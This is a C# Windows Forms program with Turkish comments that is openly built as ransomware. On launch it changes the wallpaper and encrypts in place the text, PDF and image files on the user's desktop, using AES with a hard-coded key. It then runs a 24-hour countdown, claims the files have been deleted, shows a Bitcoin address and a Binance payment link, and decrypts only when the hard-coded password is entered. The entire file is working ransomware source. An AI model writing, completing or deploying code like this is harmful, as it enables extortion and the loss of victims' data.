using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices; // DllImport için gerekli
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Drawing;
using System.Linq; // IEnumerable kullanmak için
using System.Windows.Forms; // Clipboard ve MessageBox için



namespace FileEncryptionApp
{
    public partial class Form1 : Form
    {
        private static readonly string password = "3F4A1E2D7B8C9D0A1F2B3C4D5E6F7A8B3C4D5E6F7A8B9C0D1A2B3C4D5E6F7A8"; // Kullanıcı şifresi
        private DateTime countdownTime;


        public Form1()
        {
            InitializeComponent();
            comboBox1.SelectedItem = "Türkçe";
            listBox2.Visible = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Duvar kağıdını değiştir
            string wallpaperPath = Path.Combine(Application.StartupPath, "Images", "test.png"); // Duvar kağıdı dosya yolu

            if (File.Exists(wallpaperPath)) // Dosya var mı kontrol et
            {
                ChangeWallpaper(wallpaperPath); // Duvar kağıdını değiştir
            }
            else
            {
                MessageBox.Show("Duvar kağıdı bulunamadı: " + wallpaperPath);
            }

            // pictureBoxWallpaper'a resmi yükle
            string imagePath = Path.Combine(Application.StartupPath, "Images", "lock4.png"); // Resim dosya yolu

            if (File.Exists(imagePath)) // Dosya var mı kontrol et
            {
                pictureBoxWallpaper.Image = Image.FromFile(imagePath); // Resmi PictureBox'a yükle
                pictureBoxWallpaper.SizeMode = PictureBoxSizeMode.StretchImage; // Resim boyutunu ayarla
            }
            else
            {
                MessageBox.Show("Resim dosyası bulunamadı: " + imagePath);
            }

            // btcPictureBox'a resmi yükle
            string btcImagePath = Path.Combine(Application.StartupPath, "Images", "btc2.jpg"); // BTC resim dosya yolu

            if (File.Exists(btcImagePath)) // Dosya var mı kontrol et
            {
                btcPictureBox.Image = Image.FromFile(btcImagePath); // Resmi btcPictureBox'a yükle
                btcPictureBox.SizeMode = PictureBoxSizeMode.StretchImage; // Resim boyutunu ayarla
            }
            else
            {
                MessageBox.Show("BTC Resim dosyası bulunamadı: " + btcImagePath);
            }

            // Form yüklendiğinde otomatik dosyaları şifrele
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            try
            {
                EncryptFiles(desktopPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Hata: {ex.Message}");
            }
            // Geri sayım zamanını ayarla (24 saat)
            countdownTime = DateTime.Today.AddDays(1).AddHours(0).AddMinutes(0).AddSeconds(0); // 24:00:00
            timerCountdown.Start(); // Timer'ı başlat


        }

        // Duvar kağıdını değiştir
        public void ChangeWallpaper(string path)
        {
            const int SPI_SETDESKWALLPAPER = 20;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDCHANGE = 0x02;

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        // Dosyaları Şifrele
        private void EncryptFiles(string folderPath)
        {
            // Hedef dosya uzantıları
            var extensions = new[] { "*.txt", "*.pdf", "*.png", "*.jpg" };
            var files = new List<string>();

            // Belirtilen uzantılara sahip dosyaları bul
            foreach (var ext in extensions)
            {
                files.AddRange(Directory.GetFiles(folderPath, ext));
            }

            if (files.Count == 0)
            {
                MessageBox.Show("Şifrelenecek dosya bulunamadı.");
                return;
            }

            foreach (var file in files)
            {
                byte[] encryptedContent = EncryptFile(File.ReadAllBytes(file), password);
                File.WriteAllBytes(file, encryptedContent);
                progressBar.Value++;
            }
            progressBar.Visible = false; // İşlem tamamlandıktan sonra gizle
            MessageBox.Show("Dosyalar şifrelendi!");
        }

        // Dosyaları Şifresini Çöz
        private void DecryptFiles(string folderPath)
        {
            // Hedef dosya uzantıları   
            var extensions = new[] { "*.txt", "*.pdf", "*.png", "*.jpg" };
            var files = new List<string>();

            // Belirtilen uzantılara sahip dosyaları bul
            foreach (var ext in extensions)
            {
                files.AddRange(Directory.GetFiles(folderPath, ext));
            }

            foreach (var file in files)
            {
                byte[] decryptedContent = DecryptFile(File.ReadAllBytes(file), password);
                File.WriteAllBytes(file, decryptedContent);
            }
        }

        // Şifreleme Fonksiyonu
        private byte[] EncryptFile(byte[] fileContent, string password)
        {
            using (Aes aes = Aes.Create())
            {
                byte[] key = Encoding.UTF8.GetBytes(password.PadRight(32).Substring(0, 32));
                aes.Key = key;
                aes.GenerateIV();
                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    using (var ms = new MemoryStream())
                    {
                        ms.Write(aes.IV, 0, aes.IV.Length);
                        using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                        {
                            cs.Write(fileContent, 0, fileContent.Length);
                        }
                        return ms.ToArray();
                    }
                }
            }
        }

        private byte[] DecryptFile(byte[] encryptedContent, string password)
        {
            using (Aes aes = Aes.Create())
            {
                byte[] key = Encoding.UTF8.GetBytes(password.PadRight(32).Substring(0, 32));
                aes.Key = key;
                byte[] iv = new byte[16];
                Array.Copy(encryptedContent, iv, iv.Length);
                aes.IV = iv;
                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
                        {
                            cs.Write(encryptedContent, iv.Length, encryptedContent.Length - iv.Length);
                        }
                        return ms.ToArray();
                    }
                }
            }
        }

        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            try
            {
                EncryptFiles(desktopPath);
                MessageBox.Show("Dosyalar şifrelendi!");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Hata: {ex.Message}");
            }
        }

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            string inputPassword = txtPassword.Text; // Kullanıcının girdiği şifre
            if (inputPassword == password) // Şifre doğruysa
            {
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                // ProgressBar'ı görünür yap
                progressBar.Visible = true;
                progressBar.Value = 0; // Başlangıçta 0

                // Timer ayarları
                timerCountdown.Interval = 20; // Timer her 20 ms'de bir çalışacak
                timerCountdown.Tick += (s, args) =>
                {
                    if (progressBar.Value < progressBar.Maximum) // ProgressBar maksimum değere ulaşmadıysa
                    {
                        progressBar.PerformStep(); // ProgressBar'ı bir adım ileri al
                    }
                    else
                    {
                        timerCountdown.Stop(); // Timer'ı durdur
                        DecryptFiles(desktopPath); // Dosyaların şifresini çöz
                        MessageBox.Show("Dosyaların şifresi çözüldü!"); // Kullanıcıya bilgi ver
                        progressBar.Visible = false; // ProgressBar'ı gizle
                    }
                };

                timerCountdown.Start(); // Timer'ı başlat
            }
            else
            {
                MessageBox.Show("Yanlış şifre!"); // Yanlış şifre girildiğinde mesaj göster
            }
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            // Liste kutusundaki öğe seçimiyle ilgili işlemler buraya eklenebilir
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void cpyButton_Click(object sender, EventArgs e)
        {
            // ListBox'taki tüm öğeleri birleştirerek bir string oluştur
            string allItems = string.Join(Environment.NewLine, btcListBox.Items.Cast<string>());

            // Metni panoya kopyala
            Clipboard.SetText(allItems);

            // Kullanıcıya bilgi vermek isterseniz
            MessageBox.Show("BTC adres kopyalandı!", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            // Geri sayım hesaplama
            TimeSpan remainingTime = countdownTime - DateTime.Now;

            if (remainingTime.TotalSeconds <= 0) // Zaman dolduysa
            {
                timerCountdown.Stop(); // Timer'ı durdur
                labelCountdown.Text = "00:00:00"; // Geri sayım bitince göstereceğimiz metin
                MessageBox.Show("Tüm Dosyalarınız Silindi!", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else // Zaman hala devam ediyorsa
            {
                labelCountdown.Text = remainingTime.ToString(@"hh\:mm\:ss"); // Geri sayımı güncelle
            }
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            // Linkin açılacağı URL
            System.Diagnostics.Process.Start("https://tr.wikipedia.org/wiki/Bitcoin"); // URL'yi buraya ekleyin
        }

        private void paymentButton_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.binance.com/en"); // Binance URL'si
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            // comboBox1'den seçilen dil kontrolü
            if (comboBox1.SelectedItem?.ToString() == "Türkçe")
            {
                listBox1.Visible = true; // ListBox1'i göster
                listBox2.Visible = false;  // ListBox2'yi gizle
            }
            else if (comboBox1.SelectedItem?.ToString() == "İngilizce")
            {
                listBox1.Visible = false;  // ListBox1'i gizle
                listBox2.Visible = true;  // ListBox2'yi göster
            }
            else
            {
                // Seçim geçersizse her iki listBox'ı da gizle
                listBox1.Visible = false;
                listBox2.Visible = false;
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            // Linkin açılacağı URL
            System.Diagnostics.Process.Start("https://furkansarisin.github.io/WebProjem/"); // URL'yi buraya ekleyin
        }
    }
}
